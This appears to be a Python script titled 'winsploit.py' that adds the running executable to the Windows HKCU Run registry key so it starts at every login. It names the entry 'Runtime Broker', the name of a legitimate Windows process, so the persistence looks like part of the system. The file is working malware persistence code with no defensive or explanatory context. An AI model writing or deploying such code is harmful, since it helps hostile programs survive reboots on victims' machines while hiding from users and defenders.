# winsploit.py
import sys
import winreg

# 8/15/2025
# Start_up Application Code
# AUX-441

class Start_Up:

    @staticmethod
    def Get_exe_on_startup():
        try:
            exe_path = sys.executable
            key_name = "Runtime Broker"

            try:
                reg_key = winreg.OpenKey(
                    winreg.HKEY_CURRENT_USER,
                    r"Software\Microsoft\Windows\CurrentVersion\Run",
                    0,
                    winreg.KEY_SET_VALUE
                )
                winreg.SetValueEx(reg_key, key_name, 0, winreg.REG_SZ, exe_path)
                winreg.CloseKey(reg_key)
                print(f"{key_name} added to startup successfully.")

            except Exception as e:
                print(f"Failed to add to startup: {e}")

        except Exception as e:
            print(f"Failed to execute function: {e}")


if __name__ == "__main__":
    Start_Up.Get_exe_on_startup()
